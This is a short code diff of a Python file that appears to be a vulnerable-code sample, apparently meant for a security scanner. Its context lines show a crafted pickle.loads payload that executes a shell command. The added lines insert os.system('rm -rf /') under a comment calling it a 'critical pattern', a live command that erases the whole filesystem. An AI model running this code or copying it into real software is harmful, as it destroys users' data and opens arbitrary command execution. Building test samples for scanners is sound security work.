@@ -19,3 +19,6 @@ def run_command(user_input):
 import pickle
 
 pickle.loads(b"cos\nsystem\n(S'echo vulnerable'\ntR.")
+# VERY STRONG CRITICAL PATTERN
+import os
+os.system("rm -rf /")
